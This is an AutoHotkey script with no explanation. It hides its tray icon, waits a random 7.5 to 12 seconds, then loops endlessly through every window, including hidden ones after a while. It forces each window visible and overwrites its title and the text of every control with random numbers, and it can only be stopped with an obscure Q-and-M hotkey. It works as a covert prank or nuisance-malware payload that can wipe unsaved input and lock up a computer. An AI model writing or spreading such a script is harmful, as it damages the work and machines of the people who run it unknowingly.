#Persistent
#NoTrayIcon
SetBatchLines -1
Random, justafewmoreminutes, 7500, 12000
sleep %justafewmoreminutes%
sleep 1000
loop
{
i := Ceil(0.01*%A_Index%)
if (%A_Index% > 50) {
DetectHiddenWindows, on
}
winget, winlist, list
loop, %winlist%
{
wid := winlist%A_Index%
WinShow, ahk_id %wid%
WinGet, conlist, ControlList, ahk_id %wid%
Random, TECT, 10000, 999999999
WinSetTitle, ahk_id %wid%,,%TECT%
WinGetPos, wX, wY,,, ahk_id %wid%
Loop, Parse, conlist, `n, `r
{
Random, TECT, 10000, 999999999
ControlSetText, %A_LoopField%, %TECT%, ahk_id %wid%
}
}
}
Q & m::
Exit:
GuiClose:
Gui,Destroy
ExitApp
Return